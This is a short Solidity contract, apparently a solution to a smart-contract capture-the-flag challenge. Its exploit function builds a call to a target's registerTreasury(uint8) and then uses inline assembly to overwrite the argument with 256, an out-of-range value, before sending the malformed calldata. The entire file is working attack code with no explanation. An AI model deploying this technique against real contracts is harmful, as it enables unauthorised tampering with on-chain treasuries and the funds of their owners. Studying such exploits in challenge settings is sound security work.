// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HigherOrderAttackV2 {
    function exploit(address target) external {
        // Call registerTreasury with crafted calldata
        // Function selector: 0x211c85ab
        bytes memory payload = abi.encodeWithSignature("registerTreasury(uint8)", 0);
        
        // Replace the uint8 value with a uint256 value > 255
        assembly {
            mstore(add(payload, 0x24), 256)
        }
        
        (bool success, ) = target.call(payload);
        require(success, "registerTreasury failed");
    }
}